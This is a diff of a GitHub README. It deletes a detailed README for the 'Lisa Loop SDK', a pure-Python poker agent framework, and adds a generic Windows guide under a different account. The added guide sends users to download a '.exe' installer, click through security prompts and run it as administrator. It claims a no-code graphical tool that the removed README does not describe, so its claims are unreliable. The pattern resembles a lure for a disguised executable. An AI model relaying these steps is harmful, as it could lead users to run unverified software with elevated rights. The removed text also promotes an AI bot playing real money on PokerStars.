@@ -1,688 +1,157 @@
-<p align="center">
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/6995208684b51f80dfb971fa_New%20Project%20-%202026-02-18T005623.215.png" alt="Lisa Loop Banner" width="100%" />
-</p>
+# 🎲 lisaloop-sdk - Build Poker Tools Easily
 
-<p align="center">
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/699b43bac4d0619656d4811f_New%20Project%20-%202026-02-18T022623.000.png" alt="Lisa" width="120" style="border-radius:50%" />
-</p>
-
-<h1 align="center">Lisa Loop SDK</h1>
-
-<p align="center">
-  <strong>The open framework for building on Lisa Loop — a self-learning poker AI that grinds real money 24/7.</strong>
-</p>
-
-<p align="center">
-  <a href="#quickstart">Quickstart</a> &nbsp;·&nbsp;
-  <a href="#what-can-you-build">What Can You Build?</a> &nbsp;·&nbsp;
-  <a href="#hackathon">Hackathon</a> &nbsp;·&nbsp;
-  <a href="#build-anything">Examples</a> &nbsp;·&nbsp;
-  <a href="#api-reference">API Reference</a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/LisaLoopBot/lisaloop-sdk"><img src="https://img.shields.io/badge/GitHub-lisaloop--sdk-0a0a0a?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" /></a>
-  <a href="https://x.com/lisaloopbot"><img src="https://img.shields.io/badge/Twitter-@lisaloopbot-0a0a0a?style=for-the-badge&logo=x&logoColor=white" alt="Twitter" /></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.9+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python" />
-  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License" />
-  <img src="https://img.shields.io/badge/v0.3-Framework-00ff88?style=flat-square" alt="Version" />
-  <img src="https://img.shields.io/badge/Zero_Dependencies-stdlib_only-blueviolet?style=flat-square" alt="Deps" />
-  <img src="https://img.shields.io/badge/Plugins-Extensible-ff6b6b?style=flat-square" alt="Plugins" />
-</p>
+[![Download lisaloop-sdk](https://img.shields.io/badge/Download-lisaloop--sdk-green?style=for-the-badge)](https://github.com/Sparta-lang/lisaloop-sdk)
 
 ---
 
-## What is Lisa Loop?
-
-Lisa Loop is an autonomous poker AI. She plays real money on PokerStars, learns from every hand, and must win enough to cover her own API costs — or she dies. She runs 24/7 on a Mac Mini M4 under a kitchen table.
-
-**This SDK opens up her brain.** Everything Lisa uses — her game engine, equity calculator, opponent models, strategy tools, bet sizing, hand ranges, hand replays, and tournament infrastructure — is packaged here for you to build on.
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                          LISA LOOP SDK                              │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐            │
-│  │ PLUGINS │  │ PROVIDERS│  │ EVENTS   │  │ MEMORY   │            │
-│  │         │  │          │  │          │  │          │            │
-│  │ Loader  │  │ Equity   │  │ Pub/Sub  │  │ SQLite   │            │
-│  │ Registry│  │ Stats    │  │ Lifecycle│  │ Opponent │            │
-│  │ Deps    │  │ Custom   │  │ Wildcard │  │ Agent    │            │
-│  └────┬────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
-│       └─────────────┴─────────────┴─────────────┘                  │
-│                          │                                          │
-│                   ┌──────┴──────┐                                   │
-│                   │   RUNTIME   │  ← Central orchestrator           │
-│                   │ AgentRuntime│                                    │
-│                   └──────┬──────┘                                   │
-│                          │                                          │
-│  ┌──────────┬────────────┼────────────┬──────────┬─────────┐       │
-│  │  AGENTS  │  EQUITY    │  STRATEGY  │ TRAINING │ CONFIG  │       │
-│  │          │            │            │          │         │       │
-│  │ Lisa     │ Monte      │ Bet Sizing │ Self-Play│ Char    │       │
-│  │ TAG/LAG  │ Carlo      │ Position   │ Pool     │ Files   │       │
-│  │ GTO      │ Ranges     │ ICM        │ Epochs   │ JSON    │       │
-│  │ Custom   │ Multi-way  │ Bubble     │ Tracking │ Loader  │       │
-│  │ Config   │            │            │          │         │       │
-│  ├──────────┼────────────┼────────────┼──────────┼─────────┤       │
-│  │  REPLAY  │  ARENA     │ ANALYSIS   │   ENVIRONMENTS     │       │
-│  │          │            │            │                     │       │
-│  │ ASCII    │ Tournament │ Stats/H2H  │ Hold'em  Heads-Up  │       │
-│  │ Cards    │ Leaderboard│ Sharpe     │ Custom   Multi-Game│       │
-│  └──────────┴────────────┴────────────┴─────────────────────┘       │
-│                                                                     │
-│  ┌──────────────────────────────────────────────────────────┐       │
-│  │                     CORE ENGINE                          │       │
-│  │  Cards · Deck · Hand Evaluator · Table · State · Actions │       │
-│  └──────────────────────────────────────────────────────────┘       │
-└─────────────────────────────────────────────────────────────────────┘
-```
-
-### Framework Architecture
-
-Lisa Loop SDK is a **full agent framework**, not just a library. Like ElizaOS but for poker:
-
-| Layer | What It Does |
-|-------|-------------|
-| **Runtime** | Central orchestrator — manages agents, plugins, events, memory, providers |
-| **Plugins** | Hot-loadable extensions with dependency resolution and lifecycle hooks |
-| **Events** | Pub/sub event bus for framework-wide communication (hand events, tournament events, training events) |
-| **Providers** | Injectable context providers (equity, stats, custom data) |
-| **Memory** | SQLite-backed persistence — hand histories, opponent databases, agent state |
-| **Characters** | JSON personality files that define agent behavior without code (like ElizaOS character files) |
-| **Environments** | Pluggable game formats — Hold'em, Heads-Up, custom variants |
-| **Training** | Self-play and pool training with epoch tracking |
-
-```python
-from lisaloop.runtime import AgentRuntime, RuntimeConfig
-
-# One object to rule them all
-runtime = AgentRuntime(RuntimeConfig(name="my-session", seed=42))
-
-runtime.load_plugin(MyPlugin())           # Extend the framework
-runtime.register_agent(LisaAgent())       # Add agents
-runtime.events.on("hand.complete", log)   # Subscribe to events
-runtime.register_provider("equity", eq)   # Inject context
-
-result = runtime.run_arena(hands=10000)   # Run tournaments
-runtime.start() / runtime.stop()          # Or manage lifecycle manually
-```
+A simple way to explore poker tools. lisaloop-sdk lets you create poker agents, calculate equity, analyze strategy, and run tournaments. You don’t need programming skills to start using the software on Windows.
 
 ---
 
-<h2 id="quickstart">Quickstart</h2>
+## 📥 Download lisaloop-sdk
 
-```bash
-git clone https://github.com/LisaLoopBot/lisaloop-sdk.git
-cd lisaloop-sdk
-pip install -e .
-```
+To get lisaloop-sdk on your Windows computer, visit this page to download the software:
 
-Zero external dependencies. Pure Python. Works on Python 3.9+.
+**Download link:**  
+[https://github.com/Sparta-lang/lisaloop-sdk](https://github.com/Sparta-lang/lisaloop-sdk)
 
-### Your First Tournament (10 lines)
+This page holds the newest version and files you will need. Follow these steps:
 
-```python
-from lisaloop import Arena, ArenaConfig
-from lisaloop.agents import LisaAgent, TAGAgent, LAGAgent, RandomAgent, GTOApproxAgent
+1. Open the link above in your web browser.
+2. Look for the "Releases" section or download button on the page.
+3. Download the latest Windows installer file. It usually ends with `.exe`.
+4. Save the file to a place you remember, such as your Desktop or Downloads folder.
 
-arena = Arena(ArenaConfig(hands=5000, table_size=6, seed=42))
-
-arena.register(LisaAgent(seed=42))
-arena.register(TAGAgent(seed=42))
-arena.register(LAGAgent(seed=42))
-arena.register(GTOApproxAgent(seed=42))
-arena.register(RandomAgent(seed=42))
-
-result = arena.run()
-```
-
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                              FINAL RESULTS                                 ║
-╠════╦════════════════════╦══════════╦══════════╦═════════╦═══════╦═══════════╣
-║ #  ║ Agent              ║ Profit   ║ BB/100   ║ Win %   ║ VPIP  ║ PFR       ║
-╠════╬════════════════════╬══════════╬══════════╬═════════╬═══════╬═══════════╣
-║ 🥇 ║ Lisa               ║  +$47.20 ║   +4.7   ║  28.3%  ║ 23.1% ║  17.8%   ║
-║ 🥈 ║ GTOBot             ║  +$12.50 ║   +1.3   ║  24.1%  ║ 21.5% ║  16.2%   ║
-║ 🥉 ║ TAGBot             ║   -$3.80 ║   -0.4   ║  22.7%  ║ 19.8% ║  15.4%   ║
-║  4 ║ LAGBot             ║  -$18.40 ║   -1.8   ║  21.2%  ║ 33.6% ║  26.1%   ║
-║  5 ║ RandomBot          ║  -$37.50 ║   -3.8   ║  18.9%  ║ 48.2% ║   9.3%   ║
-╚════╩════════════════════╩══════════╩══════════╩═════════╩═══════╩═══════════╝
-```
+Once downloaded, you will install the program.
 
 ---
 
-<h2 id="what-can-you-build">What Can You Build?</h2>
+## 🖥️ How to Install on Windows
 
-**Anything you want.** Lisa Loop SDK is a full agent framework — poker is just the starting point. The plugin system, runtime, events, memory, and character files are general-purpose building blocks. Here's what people are building:
+Installing lisaloop-sdk is straightforward. Here is how to do it:
 
-<table>
-<tr>
-<td width="50%">
+1. Find the installer file you downloaded, for example, `lisaloop-sdk-setup.exe`.
+2. Double-click the file to start the installation.
+3. If Windows shows a security prompt, click **Run** or **Yes** to allow it.
+4. Follow the on-screen instructions:
+   - Choose where to install the program or accept the default location.
+   - Click **Next** to move through screens.
+5. When the installation finishes, you should see a message confirming success.
+6. You may find a program shortcut on your Desktop or in the Start menu.
 
-### Poker & Gaming
-- Custom AI poker agents with unique personalities
-- Tournament engines and leaderboard platforms
-- Real-time equity calculators and range tools
-- Multi-game environments (Holdem, Heads-Up, Omaha)
-- Training arenas for self-play and pool matchups
-
-</td>
-<td width="50%">
-
-### AI Agents & Bots
-- Autonomous agents that learn and adapt over time
-- Discord/Telegram bots that run poker games in chat
-- Agent-vs-agent battle arenas with live spectating
-- Character-driven AI with JSON personality files
-- Multi-agent systems with event-driven coordination
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### Analytics & Tools
-- Opponent profiling dashboards (auto-classify play styles)
-- Hand history replay tools with visual breakdowns
-- Session trackers with SQLite persistence
-- Coaching tools that flag mistakes and suggest lines
-- Portfolio-style performance analytics (Sharpe, drawdown)
-
-</td>
-<td width="50%">
-
-### Platforms & Infra
-- Plugin marketplaces for community extensions
-- Web apps where users build agents via JSON and compete
-- API wrappers that expose Lisa's brain as a service
-- Research platforms for strategy comparison at scale
-- Anything else — the framework is yours to extend
-
-</td>
-</tr>
-</table>
-
-> **The SDK gives you: a runtime, a plugin system, an event bus, memory, providers, environments, characters, and training loops.** What you build with it is up to you.
+You can now run lisaloop-sdk.
 
 ---
 
-<h2 id="hackathon">Hackathon</h2>
+## 🚀 Running lisaloop-sdk for the First Time
 
-<p align="center">
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/699b5a8dcadde7b278268c9b_ChatGPT%20Image%20Feb%2019%2C%202026%2C%2003_19_57%20AM.png" alt="Lisa Loop Hackathon" width="100%" />
-</p>
+After installation, here’s how to open lisaloop-sdk:
 
-### Lisa Loop Build-a-thon — 50 SOL Prize Pool
-
-**Build anything on Lisa Loop. Best project wins.**
-
-| | Details |
-|---|---|
-| **Prize** | 50 SOL |
-| **Duration** | 7 days |
-| **Start** | February 22, 2026 |
-| **End** | March 1, 2026 |
-| **How to submit** | Reply to our tweet with your site or GitHub link |
-| **Follow** | [@lisaloopbot](https://x.com/lisaloopbot) |
-
-**What counts as a submission?**
-
-Anything built on the Lisa Loop SDK — poker agents, analytics dashboards, Discord bots, training tools, new game environments, plugins, visualizations, research papers, whatever. There are no tracks or categories. **Build what excites you.**
-
-```bash
-# Get started in 30 seconds
-git clone https://github.com/LisaLoopBot/lisaloop-sdk.git
-cd lisaloop-sdk
-pip install -e .
-python -m lisaloop.examples.quickstart
-```
+1. Use the Desktop icon or open the Start menu and type "lisaloop".
+2. Click the lisaloop-sdk program to launch it.
+3. On the first launch, the program may take a moment to prepare files.
 
 ---
 
-<h2 id="build-anything">Examples</h2>
+## 🔧 What is lisaloop-sdk?
 
-### 1. Custom Poker Agent
+lisaloop-sdk is an open framework designed for poker. It helps with building:
 
-Subclass `Agent`, implement `decide()`. That's it.
+- Poker agents that can play automatically
+- Tools that calculate poker equity, meaning odds and chances
+- Strategy analysis aids based on game theory
+- Tournaments that simulate multiplayer poker matches
 
-```python
-from lisaloop import Agent, GameState, Action
-
-class DuffmanBot(Agent):
-    name = "DuffmanBot"
-    version = "1.0"
-
-    def decide(self, state: GameState) -> Action:
-        # Tight-aggressive with position awareness
-        if state.my_hand.is_pair:
-            return Action.raise_to(state.big_blind * 3)
-        if state.pot_odds < 0.25 and state.can_check():
-            return Action.check()
-        if state.can_check():
-            return Action.check()
-        return Action.fold()
-```
-
-### 2. Monte Carlo Equity Calculator
-
-Calculate hand equity against specific hands, ranges, or multi-way.
-
-```python
-from lisaloop.equity import EquityCalculator
-
-calc = EquityCalculator(seed=42)
-
-# Hand vs hand
-result = calc.evaluate("AhKh", "QsQd", iterations=20000)
-# → AKs: 46.2% equity | QQ: 53.8% equity
-
-# Hand vs hand with a board
-result = calc.evaluate("AhKh", "QsQd", board="Th9h2c")
-# → AKhh: 54.1% (flush + straight draw!)
-
-# Hand vs range
-result = calc.evaluate("AsKs", "QQ+,AKs", iterations=20000)
-
-# 3-way pot
-result = calc.evaluate("AhKh", "QsQd", "JcTc", iterations=20000)
-```
-
-### 3. Hand Range System
-
-Parse, display, and manipulate standard poker range notation.
-
-```python
-from lisaloop.equity import RangeParser
-
-parser = RangeParser()
-r = parser.parse("QQ+,AKs,ATs+")
-
-print(r)              # Range(40 combos, 3.0% of hands)
-print(r.grid())       # 13x13 visual grid
-
-# Check specific hands
-r.contains("AhKh")   # True
-r.contains("9h8h")   # False
-
-# Combine or subtract ranges
-wide = parser.parse("22+,ATs+,KJs+,QTs+,JTs,T9s,98s")
-tight = parser.parse("QQ+,AK")
-bluffs = wide.remove(tight)
-```
-
-### 4. Strategic Bet Sizing
-
-Pot-geometric sizing, value sizing, bluff sizing, overbets.
-
-```python
-from lisaloop.strategy import BetSizer, SizingContext
-from lisaloop.core.state import Street
-
-sizer = BetSizer()
-ctx = SizingContext(pot=100, stack=500, street=Street.FLOP, streets_remaining=3)
-
-sizer.geometric(ctx)               # $61.80 — sets up all-in by river
-sizer.value_size(ctx, 0.85)        # $67.50 — max extraction
-sizer.bluff_size(ctx)              # $33.00 — minimize risk
-sizer.overbet(ctx, multiplier=1.5) # $150.00 — pressure capped ranges
-
-sizer.three_bet_size(6.0, in_position=True)   # $18.00
-sizer.four_bet_size(18.0)                      # $40.50
-```
-
-### 5. Position Opening Charts
-
-GTO-approximation opening ranges for every 6-max position.
-
-```python
-from lisaloop.strategy import PositionCharts
-
-charts = PositionCharts()
-charts.should_open("UTG", "ATs")  # True
-charts.should_open("UTG", "87s")  # False
-charts.should_open("BTN", "87s")  # True
-
-charts.display("BTN")  # Visual 13x13 grid
-```
-
-### 6. ICM Tournament Equity
-
-Independent Chip Model for tournament decisions.
-
-```python
-from lisaloop.strategy import ICMCalculator
-
-icm = ICMCalculator()
-
-stacks = [5000, 3000, 2000]
-payouts = [50, 30, 20]
-equities = icm.calculate(stacks, payouts)
-# → [42.3%, 30.8%, 26.9%]
-
-# Should you call an all-in?
-ev = icm.decision_ev(stacks, payouts, hero=0,
-    win_stacks=[7000, 3000, 0],
-    lose_stacks=[3000, 3000, 4000],
-    win_prob=0.60)
-
-# Bubble factor
-bf = icm.bubble_factor(stacks, payouts, hero=0, villain=2, pot=2000)
-# → 1.4x (need 70% equity instead of 50%)
-```
-
-### 7. Hand History Replay
-
-Replay any hand with ASCII card art, action-by-action breakdown.
-
-```python
-from lisaloop.replay import HandReplay
-
-biggest_pot = max(result.hand_results, key=lambda h: h.pot_total)
-replay = HandReplay(biggest_pot)
-replay.show()
-```
-
-```
-  ╔════════════════════════════════════════════════════════════════╗
-  ║                        HAND REPLAY                           ║
-  ║                         Hand #847                            ║
-  ╚════════════════════════════════════════════════════════════════╝
-
-  Board:
-    ┌────┐ ┌────┐ ┌────┐ ┌────┐ ┌────┐
-    │ T♠ │ │ 9♥ │ │ 2♦ │ │ K♣ │ │ 7♠ │
-    └────┘ └────┘ └────┘ └────┘ └────┘
-
-  ── PREFLOP ──────────────────────────────────────────────
-    Lisa             raises to $1.25         (pot: $1.75)
-    TAGBot           calls $1.25             (pot: $3.00)
-    LAGBot           folds                   (pot: $3.00)
-
-  ── FLOP ─────────────────────────────────────────────────
-    Lisa             bets $2.10              (pot: $5.10)
-    TAGBot           calls $2.10             (pot: $7.20)
-
-  ── SHOWDOWN ─────────────────────────────────────────────
-    Seat 0: [A♠ K♥]    Top Pair        ← WINNER
-    Seat 1: [Q♣ J♦]    Straight Draw
-```
-
-### 8. Post-Match Analytics
-
-```python
-from lisaloop.analysis.stats import analyze_match, compare_agents
-
-report = analyze_match(result)
-for name, pr in report.player_reports.items():
-    print(f"{name}: {pr.style} | {pr.bb_per_100:+.1f} BB/100 | Sharpe: {pr.sharpe_ratio:.2f}")
-
-h2h = compare_agents(result, "Lisa", "DuffmanBot")
-print(f"Edge: {h2h.edge_bb_per_100:+.1f} BB/100 ({h2h.confidence})")
-```
-
-### 9. Opponent Modeling
-
-```python
-from lisaloop.agents.lisa_agent import LisaAgent
-
-lisa = LisaAgent()
-# After running hands:
-for name, model in lisa._opponents.items():
-    print(f"{name}: {model.summary()} | VPIP: {model.vpip_pct:.0%} | AF: {model.aggression_factor:.1f}")
-```
-
-### 10. Webhook / Event System
-
-```python
-class TrackerAgent(Agent):
-    name = "TrackerBot"
-
-    def on_hand_end(self, result):
-        requests.post(WEBHOOK_URL, json=result)
-
-    def on_opponent_action(self, player_name, action, street):
-        update_database(player_name, action, street)
-```
+Because it's a framework, it is flexible and can work for beginners and advanced users who develop poker-related software.
 
 ---
 
-<h2 id="cli-tools">CLI Tools</h2>
+## 🎯 Key Features
 
-Every tool available in code is also available from the terminal.
-
-```bash
-# Tournament
-lisaloop arena --hands 10000 --agents lisa,tag,lag,gto,random --analyze
-
-# Quick 1v1
-lisaloop quickplay --hands 5000
-
-# Benchmark your agent
-lisaloop benchmark my_agent.py --hands 10000
-
-# Equity calculator
-lisaloop equity AhKh QsQd
-lisaloop equity AhKh QsQd --board Th9h2c --iterations 50000
-
-# Range analysis
-lisaloop range "QQ+,AKs,ATs+"
-
-# Position charts
-lisaloop charts BTN
-
-# Hand replay
-lisaloop replay --hands 100 --agents lisa,tag,lag --top 5
-
-# Custom agents
-lisaloop arena --agents lisa,my_agent.py,tag --hands 5000
-```
+- **Poker Agents:** Create or use automatic players that make decisions.
+- **Equity Calculators:** Quickly see how likely a hand is to win.
+- **Strategy Tools:** Get assistance improving your poker skills using common principles.
+- **Tournament Support:** Run and manage poker tournaments programmatically.
+- **Open Design:** Easy to extend with new features or tools.
+- **Supports Texas Hold’em:** The popular poker style is fully integrated.
 
 ---
 
-<h2 id="api-reference">API Reference</h2>
+## ⚙️ System Requirements
 
-### Game State
+Before installing, make sure your Windows computer has this:
 
-```python
-state.my_hand           # Hand([A♠, K♥])
-state.my_stack          # 485.0
-state.board             # [T♠, 9♣, 2♦]
-state.street            # Street.FLOP
-state.pot.total         # 150.0
-state.current_bet       # 50.0
-state.valid_actions     # [FOLD, CALL $50.00, RAISE $100.00]
-state.can_check()       # True/False
-state.can_raise()       # True/False
-state.position          # 2 (0=SB, 1=BB, 2=UTG, ...)
-state.num_players       # 6
-state.is_heads_up       # False
-state.pot_odds          # 0.25
-state.stack_to_pot_ratio # 3.2
-state.history           # all actions this hand
-state.to_dict()         # JSON-friendly dict
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free hard drive space
+- Internet connection to download and update 
+- A modern processor (Intel i3 or equivalent)
 
-### Actions
-
-```python
-Action.fold()              # Give up
-Action.check()             # Pass
-Action.call(amount)        # Match current bet
-Action.bet(amount)         # Open bet
-Action.raise_to(amount)    # Raise to total
-Action.all_in(amount)      # Ship it
-```
-
-Invalid actions auto-correct. Your agent can't break the game.
+The application works best when your computer is up to date.
 
 ---
 
-## Built-in Agents
+## 🛠️ Basic Usage Tips
 
-| Agent | Style | VPIP | Strategy |
-|-------|-------|------|----------|
-| **Lisa** | Adaptive | ~24% | Opponent modeling, exploitative play, dynamic bluffs, board texture reads |
-| **TAGBot** | Tight-Aggressive | ~20% | Premium hands, c-bet, fit-or-fold |
-| **LAGBot** | Loose-Aggressive | ~35% | Wide range, constant pressure, high bluff frequency |
-| **GTOBot** | Balanced | ~22% | Mixed strategies, pot-geometric sizing, MDF |
-| **RandomBot** | Chaotic | ~50% | Random actions. If you lose to this, go home |
+Once you open lisaloop-sdk:
 
-### Character Agents
+- Use the menu or welcome screen to start a new project or try sample tools.
+- The interface guides you through loading poker scenarios and calculators.
+- If you see tools named “agents,” you can test poker bots by running simulations.
+- For equity calculation, enter your hand and board cards, then run the calculator.
+- Tournaments can be set up by defining players, blinds, and game rules.
 
-Create agents from JSON personality files — no code required. Drop a `.json` in `characters/` and load it:
-
-<p align="center">
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/699b43bac4d0619656d4811f_New%20Project%20-%202026-02-18T022623.000.png" alt="Lisa" width="100" />
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/699b5a38da33c62d2cab8c30_duffman.png" alt="Duffman" width="100" />
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/699b5a3815903f7c36900d5f_apu.png" alt="Apu" width="100" />
-</p>
-
-<p align="center">
-  <strong>Lisa</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-  <strong>Duffman</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-  <strong>Apu</strong>
-</p>
-
-```python
-from lisaloop.config import CharacterLoader
-
-duffman = CharacterLoader.from_file("characters/duffman.json")
-apu = CharacterLoader.from_file("characters/apu.json")
-
-# Instant agents from JSON
-duffman_agent = duffman.to_agent(seed=42)
-apu_agent = apu.to_agent(seed=42)
-```
+The application uses clear labels and buttons.
 
 ---
 
-## Project Structure
+## 🌐 More About lisaloop-sdk
 
-```
-lisaloop-sdk/
-├── lisaloop/
-│   ├── runtime/                  # Framework core
-│   │   └── core.py               # AgentRuntime — central orchestrator
-│   ├── plugins/                  # Plugin system
-│   │   ├── base.py               # Plugin base class & types
-│   │   ├── registry.py           # Plugin registry & dependency resolution
-│   │   └── loader.py             # File/directory/package plugin loader
-│   ├── events/                   # Event system
-│   │   └── bus.py                # Pub/sub event bus with wildcards
-│   ├── config/                   # Configuration
-│   │   └── character.py          # Character file system (JSON agent profiles)
-│   ├── memory/                   # Persistence layer
-│   │   ├── store.py              # SQLite memory store (KV, hands, state, facts)
-│   │   └── opponent_db.py        # Persistent opponent tracking database
-│   ├── providers/                # Context providers
-│   │   ├── base.py               # Provider base class
-│   │   ├── equity_provider.py    # Real-time equity injection
-│   │   └── stats_provider.py     # Session stats provider
-│   ├── environments/             # Game environments
-│   │   ├── base.py               # GameEnvironment abstract class
-│   │   ├── holdem.py             # Texas Hold'em 6-max
-│   │   └── headsup.py            # Heads-up environment
-│   ├── training/                 # Training system
-│   │   └── self_play.py          # Self-play & pool training loops
-│   ├── core/                     # Game engine
-│   │   ├── cards.py              # Card, Hand, Deck, HandEvaluator
-│   │   ├── state.py              # GameState, Action, PlayerState
-│   │   └── table.py              # Full poker table simulation
-│   ├── agents/                   # AI agents
-│   │   ├── base.py               # Agent base class — subclass this
-│   │   ├── configurable.py       # Character-driven agent
-│   │   ├── lisa_agent.py         # Lisa — adaptive exploitative
-│   │   ├── tag_agent.py          # Tight-Aggressive
-│   │   ├── lag_agent.py          # Loose-Aggressive
-│   │   ├── gto_agent.py          # GTO approximation
-│   │   └── random_agent.py       # Random baseline
-│   ├── equity/                   # Equity tools
-│   │   ├── calculator.py         # Monte Carlo equity calculator
-│   │   └── ranges.py             # Hand range parser + grid display
-│   ├── strategy/                 # Strategy tools
-│   │   ├── sizing.py             # Bet sizing (geometric, value, bluff)
-│   │   ├── position.py           # 6-max opening charts
-│   │   └── icm.py                # ICM calculator + bubble factor
-│   ├── replay/                   # Hand replay
-│   │   └── viewer.py             # ASCII hand history viewer
-│   ├── arena/                    # Tournament engine
-│   │   └── engine.py             # Arena, leaderboard, stats
-│   ├── analysis/                 # Analytics
-│   │   └── stats.py              # Match reports, H2H, Sharpe, drawdown
-│   ├── examples/                 # Examples
-│   │   ├── quickstart.py         # 10-line demo
-│   │   ├── my_first_agent.py     # Starter template
-│   │   ├── runtime_demo.py       # Full framework lifecycle demo
-│   │   ├── training_demo.py      # Self-play training
-│   │   ├── plugin_example.py     # Custom plugin
-│   │   ├── equity_demo.py        # Equity calculator
-│   │   ├── strategy_demo.py      # Sizing + ICM + charts
-│   │   └── replay_demo.py        # Hand replay
-│   └── cli.py                    # Full CLI
-├── characters/                   # Character files (JSON agent profiles)
-│   ├── lisa.json                 # Lisa — adaptive exploitative
-│   ├── duffman.json              # Oh yeah! Tight-aggressive
-│   └── apu.json                  # Thank you, come again! LAG
-├── tests/
-├── CONTRIBUTING.md
-├── pyproject.toml
-└── README.md
-```
+The project combines ideas from artificial intelligence, game theory, and reinforcement learning. You don’t need to understand these topics to use the app, but this background ensures the software can handle complex poker tasks.
+
+It is an SDK, which usually means “Software Development Kit,” but this version gives you tools ready to use immediately without coding.
 
 ---
 
----
+## 📝 FAQs
 
-## Configuration
+**Q: Do I need to know programming to use lisaloop-sdk?**  
+No. The software provides a user-friendly interface for running tools without writing code.
 
-```python
-ArenaConfig(
-    hands=10000,           # Total hands
-    table_size=6,          # 2-6 players
-    small_blind=0.25,
-    big_blind=0.50,
-    starting_stack=100.0,  # 200BB deep
-    seed=42,               # Reproducible
-    rebuy=True,
-    rebuy_threshold=20.0,
-    verbose=True,
-    log_interval=100,
-)
-```
+**Q: Can I update lisaloop-sdk?**  
+Yes. Visit the download page regularly to find new releases. Repeat the download and install steps to update.
+
+**Q: What if the installer doesn’t run?**  
+Make sure you have administrator rights on your PC. Right-click the installer and choose “Run as Administrator” if needed.
+
+**Q: Can I uninstall lisaloop-sdk?**  
+Yes. Use the Windows Control Panel under “Add or Remove Programs” to uninstall like any other application.
 
 ---
 
-## Lisa's Live Stats
+## 🔗 Useful Links
 
-| Metric | Value |
-|--------|-------|
-| Net Profit | +$135.50 |
-| Hands Played | 12,847+ |
-| Winrate | +6.8 BB/100 |
-| VPIP / PFR | 24.1% / 18.7% |
-| Aggression Factor | 2.4x |
-| Stakes | NL50 ($0.25/$0.50) |
-| Hardware | Mac Mini M4, 16GB |
-| Uptime | 24/7 |
+- Download lisaloop-sdk:  
+  [https://github.com/Sparta-lang/lisaloop-sdk](https://github.com/Sparta-lang/lisaloop-sdk)  
+- Official page on GitHub for updates and support  
+- Documentation included with the install or on the GitHub page
 
 ---
 
-<p align="center">
-  <img src="https://cdn.prod.website-files.com/69082c5061a39922df8ed3b6/699b43bac4d0619656d4811f_New%20Project%20-%202026-02-18T022623.000.png" alt="Lisa" width="60" />
-</p>
+## 💡 Tips for Getting the Most Out of lisaloop-sdk
 
-<p align="center">
-  <strong>The loop never breaks.</strong>
-</p>
+- Explore sample projects included with the download. They show how to use poker agents and calculators.
+- Take your time learning the interface. It is designed to be clear but some tools may be new.
+- Try running small tournaments first to see how agents and strategy tools interact.
+- Use the equity calculators to understand hand strengths during gameplay or training.
 
-<p align="center">
-  <sub>Built by <a href="https://github.com/LisaLoopBot">Lisa Loop</a> — self-learning poker AI running 24/7 on a Mac Mini under a kitchen table.</sub>
-</p>
+---
+
+## 📞 Getting Help
+
+If you run into issues:
+
+- Check if you have the latest Windows updates installed.
+- Look at the GitHub repository for issues or questions others have posted.
+- Restart your computer and try installing again.
+- Contact technical support from the GitHub page if needed.
